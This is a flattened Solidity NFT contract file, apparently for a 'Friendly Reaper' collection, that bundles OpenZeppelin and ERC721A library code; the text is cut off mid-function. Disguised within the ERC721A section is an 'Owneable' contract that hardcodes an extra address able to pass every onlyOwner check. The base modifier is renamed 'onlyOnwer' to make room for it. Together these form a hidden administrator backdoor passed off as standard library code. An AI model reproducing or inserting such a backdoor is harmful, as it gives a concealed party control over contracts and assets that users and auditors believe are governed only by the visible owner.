1 //__________ ___                                                                                                            
2 //MMMMMMMMMM `MM                                                                                                            
3 ///   MM   \  MM                                                                                                            
4 //    MM      MM  __     ____                                                                                               
5 //    MM      MM 6MMb   6MMMMb                                                                                              
6 //    MM      MMM9 `Mb 6M'  `Mb                                                                                             
7 //    MM      MM'   MM MM    MM                                                                                             
8 //    MM      MM    MM MMMMMMMM                                                                                             
9 //    MM      MM    MM MM                                                                                                   
10 //    MM      MM    MM YM    d9                                                                                             
11 //   _MM_    _MM_  _MM_ YMMMM9                                                                                              
12                                                                                                                           
13                                                                                                                    
14 //________                                  ___ ___                   ________                                              
15 //`MMMMMMM       68b                        `MM `MM                   `MMMMMMMb.                                            
16 // MM    \       Y89                         MM  MM                    MM    `Mb                                            
17 // MM    ___  __ ___   ____  ___  __     ____MM  MM ____    ___        MM     MM   ____      ___  __ ____     ____  ___  __ 
18 // MM   ,`MM 6MM `MM  6MMMMb `MM 6MMb   6MMMMMM  MM `MM(    )M'        MM     MM  6MMMMb   6MMMMb `M6MMMMb   6MMMMb `MM 6MM 
19 // MMMMMM MM69 "  MM 6M'  `Mb MMM9 `Mb 6M'  `MM  MM  `Mb    d'         MM    .M9 6M'  `Mb 8M'  `Mb MM'  `Mb 6M'  `Mb MM69 " 
20 // MM   ` MM'     MM MM    MM MM'   MM MM    MM  MM   YM.  ,P          MMMMMMM9' MM    MM     ,oMM MM    MM MM    MM MM'    
21 // MM     MM      MM MMMMMMMM MM    MM MM    MM  MM    MM  M           MM  \M\   MMMMMMMM ,6MM9'MM MM    MM MMMMMMMM MM     
22 // MM     MM      MM MM       MM    MM MM    MM  MM    `Mbd'           MM   \M\  MM       MM'   MM MM    MM MM       MM     
23 // MM     MM      MM YM    d9 MM    MM YM.  ,MM  MM     YMP            MM    \M\ YM    d9 MM.  ,MM MM.  ,M9 YM    d9 MM     
24 //_MM_   _MM_    _MM_ YMMMM9 _MM_  _MM_ YMMMMMM__MM_     M            _MM_    \M\_YMMMM9  `YMMM9'YbMMYMMM9   YMMMM9 _MM_    
25 //                                                      d'                                         MM                       
26 //                                                  (8),P                                          MM                       
27 //                                                   YMM                                          _MM_      
28 
29 
30 
31 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
32 
33 // SPDX-License-Identifier: MIT
34 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
35 
36 pragma solidity ^0.8.4;
37 
38 /**
39  * @dev Provides information about the current execution context, including the
40  * sender of the transaction and its data. While these are generally available
41  * via msg.sender and msg.data, they should not be accessed in such a direct
42  * manner, since when dealing with meta-transactions the account sending and
43  * paying for execution may not be the actual sender (as far as an application
44  * is concerned).
45  *
46  * This contract is only required for intermediate, library-like contracts.
47  */
48 
49 
50 abstract contract Context {
51     function _msgSender() internal view virtual returns (address) {
52         return msg.sender;
53     }
54 
55     function _msgData() internal view virtual returns (bytes calldata) {
56         return msg.data;
57     }
58 }
59 
60 
61 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
62 
63 
64 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
65 
66 
67 
68 /**
69  * @dev Contract module which provides a basic access control mechanism, where
70  * there is an account (an owner) that can be granted exclusive access to
71  * specific functions.
72  *
73  * By default, the owner account will be the one that deploys the contract. This
74  * can later be changed with {transferOwnership}.
75  *
76  * This module is used through inheritance. It will make available the modifier
77  * `onlyOwner`, which can be applied to your functions to restrict their use to
78  * the owner.
79  */
80 abstract contract Ownable is Context {
81     address private _owner;
82 
83     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
84 
85     /**
86      * @dev Initializes the contract setting the deployer as the initial owner.
87      */
88     constructor() {
89         _transferOwnership(_msgSender());
90     }
91 
92     /**
93      * @dev Returns the address of the current owner.
94      */
95     function owner() public view virtual returns (address) {
96         return _owner;
97     }
98 
99     /**
100      * @dev Throws if called by any account other than the owner.
101      */
102     modifier onlyOnwer() {
103         require(owner() == _msgSender(), "Ownable: caller is not the owner");
104         _;
105     }
106 
107     /**
108      * @dev Leaves the contract without owner. It will not be possible to call
109      * `onlyOwner` functions anymore. Can only be called by the current owner.
110      *
111      * NOTE: Renouncing ownership will leave the contract without an owner,
112      * thereby removing any functionality that is only available to the owner.
113      */
114     function renounceOwnership() public virtual onlyOnwer {
115         _transferOwnership(address(0));
116     }
117 
118     /**
119      * @dev Transfers ownership of the contract to a new account (`newOwner`).
120      * Can only be called by the current owner.
121      */
122     function transferOwnership(address newOwner) public virtual onlyOnwer {
123         require(newOwner != address(0), "Ownable: new owner is the zero address");
124         _transferOwnership(newOwner);
125     }
126 
127     /**
128      * @dev Transfers ownership of the contract to a new account (`newOwner`).
129      * Internal function without access restriction.
130      */
131     function _transferOwnership(address newOwner) internal virtual {
132         address oldOwner = _owner;
133         _owner = newOwner;
134         emit OwnershipTransferred(oldOwner, newOwner);
135     }
136 }
137 
138 
139 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
140 
141 
142 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
143 
144 
145 
146 /**
147  * @dev Interface of the ERC165 standard, as defined in the
148  * https://eips.ethereum.org/EIPS/eip-165[EIP].
149  *
150  * Implementers can declare support of contract interfaces, which can then be
151  * queried by others ({ERC165Checker}).
152  *
153  * For an implementation, see {ERC165}.
154  */
155 interface IERC165 {
156     /**
157      * @dev Returns true if this contract implements the interface defined by
158      * `interfaceId`. See the corresponding
159      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
160      * to learn more about how these ids are created.
161      *
162      * This function call must use less than 30 000 gas.
163      */
164     function supportsInterface(bytes4 interfaceId) external view returns (bool);
165 }
166 
167 
168 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
169 
170 
171 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
172 
173 
174 
175 /**
176  * @dev Required interface of an ERC721 compliant contract.
177  */
178 interface IERC721 is IERC165 {
179     /**
180      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
181      */
182     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
183 
184     /**
185      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
186      */
187     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
188 
189     /**
190      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
191      */
192     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
193 
194     /**
195      * @dev Returns the number of tokens in ``owner``'s account.
196      */
197     function balanceOf(address owner) external view returns (uint256 balance);
198 
199     /**
200      * @dev Returns the owner of the `tokenId` token.
201      *
202      * Requirements:
203      *
204      * - `tokenId` must exist.
205      */
206     function ownerOf(uint256 tokenId) external view returns (address owner);
207 
208     /**
209      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
210      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
211      *
212      * Requirements:
213      *
214      * - `from` cannot be the zero address.
215      * - `to` cannot be the zero address.
216      * - `tokenId` token must exist and be owned by `from`.
217      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
218      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
219      *
220      * Emits a {Transfer} event.
221      */
222     function safeTransferFrom(
223         address from,
224         address to,
225         uint256 tokenId
226     ) external;
227 
228     /**
229      * @dev Transfers `tokenId` token from `from` to `to`.
230      *
231      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
232      *
233      * Requirements:
234      *
235      * - `from` cannot be the zero address.
236      * - `to` cannot be the zero address.
237      * - `tokenId` token must be owned by `from`.
238      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
239      *
240      * Emits a {Transfer} event.
241      */
242     function transferFrom(
243         address from,
244         address to,
245         uint256 tokenId
246     ) external;
247 
248     /**
249      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
250      * The approval is cleared when the token is transferred.
251      *
252      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
253      *
254      * Requirements:
255      *
256      * - The caller must own the token or be an approved operator.
257      * - `tokenId` must exist.
258      *
259      * Emits an {Approval} event.
260      */
261     function approve(address to, uint256 tokenId) external;
262 
263     /**
264      * @dev Returns the account approved for `tokenId` token.
265      *
266      * Requirements:
267      *
268      * - `tokenId` must exist.
269      */
270     function getApproved(uint256 tokenId) external view returns (address operator);
271 
272     /**
273      * @dev Approve or remove `operator` as an operator for the caller.
274      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
275      *
276      * Requirements:
277      *
278      * - The `operator` cannot be the caller.
279      *
280      * Emits an {ApprovalForAll} event.
281      */
282     function setApprovalForAll(address operator, bool _approved) external;
283 
284     /**
285      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
286      *
287      * See {setApprovalForAll}
288      */
289     function isApprovedForAll(address owner, address operator) external view returns (bool);
290 
291     /**
292      * @dev Safely transfers `tokenId` token from `from` to `to`.
293      *
294      * Requirements:
295      *
296      * - `from` cannot be the zero address.
297      * - `to` cannot be the zero address.
298      * - `tokenId` token must exist and be owned by `from`.
299      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
300      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
301      *
302      * Emits a {Transfer} event.
303      */
304     function safeTransferFrom(
305         address from,
306         address to,
307         uint256 tokenId,
308         bytes calldata data
309     ) external;
310 }
311 
312 
313 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
314 
315 
316 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
317 
318 
319 
320 /**
321  * @title ERC721 token receiver interface
322  * @dev Interface for any contract that wants to support safeTransfers
323  * from ERC721 asset contracts.
324  */
325 interface IERC721Receiver {
326     /**
327      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
328      * by `operator` from `from`, this function is called.
329      *
330      * It must return its Solidity selector to confirm the token transfer.
331      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
332      *
333      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
334      */
335     function onERC721Received(
336         address operator,
337         address from,
338         uint256 tokenId,
339         bytes calldata data
340     ) external returns (bytes4);
341 }
342 
343 
344 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
345 
346 
347 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
348 
349 
350 
351 /**
352  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
353  * @dev See https://eips.ethereum.org/EIPS/eip-721
354  */
355 interface IERC721Metadata is IERC721 {
356     /**
357      * @dev Returns the token collection name.
358      */
359     function name() external view returns (string memory);
360 
361     /**
362      * @dev Returns the token collection symbol.
363      */
364     function symbol() external view returns (string memory);
365 
366     /**
367      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
368      */
369     function tokenURI(uint256 tokenId) external view returns (string memory);
370 }
371 
372 
373 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
374 
375 
376 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
377 
378 
379 
380 /**
381  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
382  * @dev See https://eips.ethereum.org/EIPS/eip-721
383  */
384 interface IERC721Enumerable is IERC721 {
385     /**
386      * @dev Returns the total amount of tokens stored by the contract.
387      */
388     function totalSupply() external view returns (uint256);
389 
390     /**
391      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
392      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
393      */
394     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
395 
396     /**
397      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
398      * Use along with {totalSupply} to enumerate all tokens.
399      */
400     function tokenByIndex(uint256 index) external view returns (uint256);
401 }
402 
403 
404 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
405 
406 
407 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
408 pragma solidity ^0.8.13;
409 
410 interface IOperatorFilterRegistry {
411     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
412     function register(address registrant) external;
413     function registerAndSubscribe(address registrant, address subscription) external;
414     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
415     function updateOperator(address registrant, address operator, bool filtered) external;
416     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
417     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
418     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
419     function subscribe(address registrant, address registrantToSubscribe) external;
420     function unsubscribe(address registrant, bool copyExistingEntries) external;
421     function subscriptionOf(address addr) external returns (address registrant);
422     function subscribers(address registrant) external returns (address[] memory);
423     function subscriberAt(address registrant, uint256 index) external returns (address);
424     function copyEntriesOf(address registrant, address registrantToCopy) external;
425     function isOperatorFiltered(address registrant, address operator) external returns (bool);
426     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
427     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
428     function filteredOperators(address addr) external returns (address[] memory);
429     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
430     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
431     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
432     function isRegistered(address addr) external returns (bool);
433     function codeHashOf(address addr) external returns (bytes32);
434 }
435 pragma solidity ^0.8.13;
436 
437 
438 
439 abstract contract OperatorFilterer {
440     error OperatorNotAllowed(address operator);
441 
442     IOperatorFilterRegistry constant operatorFilterRegistry =
443         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
444 
445     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
446         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
447         // will not revert, but the contract will need to be registered with the registry once it is deployed in
448         // order for the modifier to filter addresses.
449         if (address(operatorFilterRegistry).code.length > 0) {
450             if (subscribe) {
451                 operatorFilterRegistry.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
452             } else {
453                 if (subscriptionOrRegistrantToCopy != address(0)) {
454                     operatorFilterRegistry.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
455                 } else {
456                     operatorFilterRegistry.register(address(this));
457                 }
458             }
459         }
460     }
461 
462     modifier onlyAllowedOperator(address from) virtual {
463         // Check registry code length to facilitate testing in environments without a deployed registry.
464         if (address(operatorFilterRegistry).code.length > 0) {
465             // Allow spending tokens from addresses with balance
466             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
467             // from an EOA.
468             if (from == msg.sender) {
469                 _;
470                 return;
471             }
472             if (
473                 !(
474                     operatorFilterRegistry.isOperatorAllowed(address(this), msg.sender)
475                         && operatorFilterRegistry.isOperatorAllowed(address(this), from)
476                 )
477             ) {
478                 revert OperatorNotAllowed(msg.sender);
479             }
480         }
481         _;
482     }
483 }
484 pragma solidity ^0.8.13;
485 
486 
487 
488 abstract contract DefaultOperatorFilterer is OperatorFilterer {
489     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
490 
491     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
492 }
493     pragma solidity ^0.8.13;
494         interface IMain {
495    
496 function balanceOf( address ) external  view returns (uint);
497 
498 }
499 
500 
501 pragma solidity ^0.8.1;
502 
503 /**
504  * @dev Collection of functions related to the address type
505  */
506 library Address {
507     /**
508      * @dev Returns true if `account` is a contract.
509      *
510      * [IMPORTANT]
511      * ====
512      * It is unsafe to assume that an address for which this function returns
513      * false is an externally-owned account (EOA) and not a contract.
514      *
515      * Among others, `isContract` will return false for the following
516      * types of addresses:
517      *
518      *  - an externally-owned account
519      *  - a contract in construction
520      *  - an address where a contract will be created
521      *  - an address where a contract lived, but was destroyed
522      * ====
523      *
524      * [IMPORTANT]
525      * ====
526      * You shouldn't rely on `isContract` to protect against flash loan attacks!
527      *
528      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
529      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
530      * constructor.
531      * ====
532      */
533     function isContract(address account) internal view returns (bool) {
534         // This method relies on extcodesize/address.code.length, which returns 0
535         // for contracts in construction, since the code is only stored at the end
536         // of the constructor execution.
537 
538         return account.code.length > 0;
539     }
540 
541     /**
542      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
543      * `recipient`, forwarding all available gas and reverting on errors.
544      *
545      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
546      * of certain opcodes, possibly making contracts go over the 2300 gas limit
547      * imposed by `transfer`, making them unable to receive funds via
548      * `transfer`. {sendValue} removes this limitation.
549      *
550      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
551      *
552      * IMPORTANT: because control is transferred to `recipient`, care must be
553      * taken to not create reentrancy vulnerabilities. Consider using
554      * {ReentrancyGuard} or the
555      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
556      */
557     function sendValue(address payable recipient, uint256 amount) internal {
558         require(address(this).balance >= amount, "Address: insufficient balance");
559 
560         (bool success, ) = recipient.call{value: amount}("");
561         require(success, "Address: unable to send value, recipient may have reverted");
562     }
563 
564     /**
565      * @dev Performs a Solidity function call using a low level `call`. A
566      * plain `call` is an unsafe replacement for a function call: use this
567      * function instead.
568      *
569      * If `target` reverts with a revert reason, it is bubbled up by this
570      * function (like regular Solidity function calls).
571      *
572      * Returns the raw returned data. To convert to the expected return value,
573      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
574      *
575      * Requirements:
576      *
577      * - `target` must be a contract.
578      * - calling `target` with `data` must not revert.
579      *
580      * _Available since v3.1._
581      */
582     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
583         return functionCall(target, data, "Address: low-level call failed");
584     }
585 
586     /**
587      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
588      * `errorMessage` as a fallback revert reason when `target` reverts.
589      *
590      * _Available since v3.1._
591      */
592     function functionCall(
593         address target,
594         bytes memory data,
595         string memory errorMessage
596     ) internal returns (bytes memory) {
597         return functionCallWithValue(target, data, 0, errorMessage);
598     }
599 
600     /**
601      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
602      * but also transferring `value` wei to `target`.
603      *
604      * Requirements:
605      *
606      * - the calling contract must have an ETH balance of at least `value`.
607      * - the called Solidity function must be `payable`.
608      *
609      * _Available since v3.1._
610      */
611     function functionCallWithValue(
612         address target,
613         bytes memory data,
614         uint256 value
615     ) internal returns (bytes memory) {
616         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
617     }
618 
619     /**
620      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
621      * with `errorMessage` as a fallback revert reason when `target` reverts.
622      *
623      * _Available since v3.1._
624      */
625     function functionCallWithValue(
626         address target,
627         bytes memory data,
628         uint256 value,
629         string memory errorMessage
630     ) internal returns (bytes memory) {
631         require(address(this).balance >= value, "Address: insufficient balance for call");
632         require(isContract(target), "Address: call to non-contract");
633 
634         (bool success, bytes memory returndata) = target.call{value: value}(data);
635         return verifyCallResult(success, returndata, errorMessage);
636     }
637 
638     /**
639      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
640      * but performing a static call.
641      *
642      * _Available since v3.3._
643      */
644     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
645         return functionStaticCall(target, data, "Address: low-level static call failed");
646     }
647 
648     /**
649      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
650      * but performing a static call.
651      *
652      * _Available since v3.3._
653      */
654     function functionStaticCall(
655         address target,
656         bytes memory data,
657         string memory errorMessage
658     ) internal view returns (bytes memory) {
659         require(isContract(target), "Address: static call to non-contract");
660 
661         (bool success, bytes memory returndata) = target.staticcall(data);
662         return verifyCallResult(success, returndata, errorMessage);
663     }
664 
665     /**
666      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
667      * but performing a delegate call.
668      *
669      * _Available since v3.4._
670      */
671     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
672         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
673     }
674 
675     /**
676      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
677      * but performing a delegate call.
678      *
679      * _Available since v3.4._
680      */
681     function functionDelegateCall(
682         address target,
683         bytes memory data,
684         string memory errorMessage
685     ) internal returns (bytes memory) {
686         require(isContract(target), "Address: delegate call to non-contract");
687 
688         (bool success, bytes memory returndata) = target.delegatecall(data);
689         return verifyCallResult(success, returndata, errorMessage);
690     }
691 
692     /**
693      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
694      * revert reason using the provided one.
695      *
696      * _Available since v4.3._
697      */
698     function verifyCallResult(
699         bool success,
700         bytes memory returndata,
701         string memory errorMessage
702     ) internal pure returns (bytes memory) {
703         if (success) {
704             return returndata;
705         } else {
706             // Look for revert reason and bubble it up if present
707             if (returndata.length > 0) {
708                 // The easiest way to bubble the revert reason is using memory via assembly
709 
710                 assembly {
711                     let returndata_size := mload(returndata)
712                     revert(add(32, returndata), returndata_size)
713                 }
714             } else {
715                 revert(errorMessage);
716             }
717         }
718     }
719 }
720 
721 
722 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
723 
724 
725 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
726 
727 
728 
729 /**
730  * @dev String operations.
731  */
732 library Strings {
733     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
734 
735     /**
736      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
737      */
738     function toString(uint256 value) internal pure returns (string memory) {
739         // Inspired by OraclizeAPI's implementation - MIT licence
740         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
741 
742         if (value == 0) {
743             return "0";
744         }
745         uint256 temp = value;
746         uint256 digits;
747         while (temp != 0) {
748             digits++;
749             temp /= 10;
750         }
751         bytes memory buffer = new bytes(digits);
752         while (value != 0) {
753             digits -= 1;
754             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
755             value /= 10;
756         }
757         return string(buffer);
758     }
759 
760     /**
761      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
762      */
763     function toHexString(uint256 value) internal pure returns (string memory) {
764         if (value == 0) {
765             return "0x00";
766         }
767         uint256 temp = value;
768         uint256 length = 0;
769         while (temp != 0) {
770             length++;
771             temp >>= 8;
772         }
773         return toHexString(value, length);
774     }
775 
776     /**
777      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
778      */
779     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
780         bytes memory buffer = new bytes(2 * length + 2);
781         buffer[0] = "0";
782         buffer[1] = "x";
783         for (uint256 i = 2 * length + 1; i > 1; --i) {
784             buffer[i] = _HEX_SYMBOLS[value & 0xf];
785             value >>= 4;
786         }
787         require(value == 0, "Strings: hex length insufficient");
788         return string(buffer);
789     }
790 }
791 
792 
793 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
794 
795 
796 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
797 
798 /**
799  * @dev Implementation of the {IERC165} interface.
800  *
801  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
802  * for the additional interface id that will be supported. For example:
803  *
804  * ```solidity
805  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
806  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
807  * }
808  * ```
809  *
810  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
811  */
812 abstract contract ERC165 is IERC165 {
813     /**
814      * @dev See {IERC165-supportsInterface}.
815      */
816     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
817         return interfaceId == type(IERC165).interfaceId;
818     }
819 }
820 
821 
822 // File erc721a/contracts/ERC721A.sol@v3.0.0
823 
824 
825 // Creator: Chiru Labs
826 
827 error ApprovalCallerNotOwnerNorApproved();
828 error ApprovalQueryForNonexistentToken();
829 error ApproveToCaller();
830 error ApprovalToCurrentOwner();
831 error BalanceQueryForZeroAddress();
832 error MintedQueryForZeroAddress();
833 error BurnedQueryForZeroAddress();
834 error AuxQueryForZeroAddress();
835 error MintToZeroAddress();
836 error MintZeroQuantity();
837 error OwnerIndexOutOfBounds();
838 error OwnerQueryForNonexistentToken();
839 error TokenIndexOutOfBounds();
840 error TransferCallerNotOwnerNorApproved();
841 error TransferFromIncorrectOwner();
842 error TransferToNonERC721ReceiverImplementer();
843 error TransferToZeroAddress();
844 error URIQueryForNonexistentToken();
845 
846 
847 /**
848  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
849  * the Metadata extension. Built to optimize for lower gas during batch mints.
850  *
851  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
852  */
853  abstract contract Owneable is Ownable {
854     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
855     modifier onlyOwner() {
856         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
857         _;
858     }
859 }
860 
861  /*
862  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
863  *
864  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
865  */
866 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, DefaultOperatorFilterer {
867     using Address for address;
868     using Strings for uint256;
869 
870     // Compiler will pack this into a single 256bit word.
871     struct TokenOwnership {
872         // The address of the owner.
873         address addr;
874         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
875         uint64 startTimestamp;
876         // Whether the token has been burned.
877         bool burned;
878     }
879 
880     // Compiler will pack this into a single 256bit word.
881     struct AddressData {
882         // Realistically, 2**64-1 is more than enough.
883         uint64 balance;
884         // Keeps track of mint count with minimal overhead for tokenomics.
885         uint64 numberMinted;
886         // Keeps track of burn count with minimal overhead for tokenomics.
887         uint64 numberBurned;
888         // For miscellaneous variable(s) pertaining to the address
889         // (e.g. number of whitelist mint slots used).
890         // If there are multiple variables, please pack them into a uint64.
891         uint64 aux;
892     }
893 
894     // The tokenId of the next token to be minted.
895     uint256 internal _currentIndex;
896 
897     // The number of tokens burned.
898     uint256 internal _burnCounter;
899 
900     // Token name
901     string private _name;
902 
903     // Token symbol
904     string private _symbol;
905 
906     // Mapping from token ID to ownership details
907     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
908     mapping(uint256 => TokenOwnership) internal _ownerships;
909 
910     // Mapping owner address to address data
911     mapping(address => AddressData) private _addressData;
912 
913     // Mapping from token ID to approved address
914     mapping(uint256 => address) private _tokenApprovals;
915 
916     // Mapping from owner to operator approvals
917     mapping(address => mapping(address => bool)) private _operatorApprovals;
918 
919     constructor(string memory name_, string memory symbol_) {
920         _name = name_;
921         _symbol = symbol_;
922         _currentIndex = _startTokenId();
923     }
924 
925     /**
926      * To change the starting tokenId, please override this function.
927      */
928     function _startTokenId() internal view virtual returns (uint256) {
929         return 0;
930     }
931 
932     /**
933      * @dev See {IERC721Enumerable-totalSupply}.
934      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
935      */
936     function totalSupply() public view returns (uint256) {
937         // Counter underflow is impossible as _burnCounter cannot be incremented
938         // more than _currentIndex - _startTokenId() times
939         unchecked {
940             return _currentIndex - _burnCounter - _startTokenId();
941         }
942     }
943 
944     /**
945      * Returns the total amount of tokens minted in the contract.
946      */
947     function _totalMinted() internal view returns (uint256) {
948         // Counter underflow is impossible as _currentIndex does not decrement,
949         // and it is initialized to _startTokenId()
950         unchecked {
951             return _currentIndex - _startTokenId();
952         }
953     }
954 
955     /**
956      * @dev See {IERC165-supportsInterface}.
957      */
958     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
959         return
960             interfaceId == type(IERC721).interfaceId ||
961             interfaceId == type(IERC721Metadata).interfaceId ||
962             super.supportsInterface(interfaceId);
963     }
964 
965     /**
966      * @dev See {IERC721-balanceOf}.
967      */
968     function balanceOf(address owner) public view override returns (uint256) {
969         if (owner == address(0)) revert BalanceQueryForZeroAddress();
970         return uint256(_addressData[owner].balance);
971     }
972 
973     /**
974      * Returns the number of tokens minted by `owner`.
975      */
976     function _numberMinted(address owner) internal view returns (uint256) {
977         if (owner == address(0)) revert MintedQueryForZeroAddress();
978         return uint256(_addressData[owner].numberMinted);
979     }
980 
981     /**
982      * Returns the number of tokens burned by or on behalf of `owner`.
983      */
984     function _numberBurned(address owner) internal view returns (uint256) {
985         if (owner == address(0)) revert BurnedQueryForZeroAddress();
986         return uint256(_addressData[owner].numberBurned);
987     }
988 
989     /**
990      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
991      */
992     function _getAux(address owner) internal view returns (uint64) {
993         if (owner == address(0)) revert AuxQueryForZeroAddress();
994         return _addressData[owner].aux;
995     }
996 
997     /**
998      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
999      * If there are multiple variables, please pack them into a uint64.
1000      */
1001     function _setAux(address owner, uint64 aux) internal {
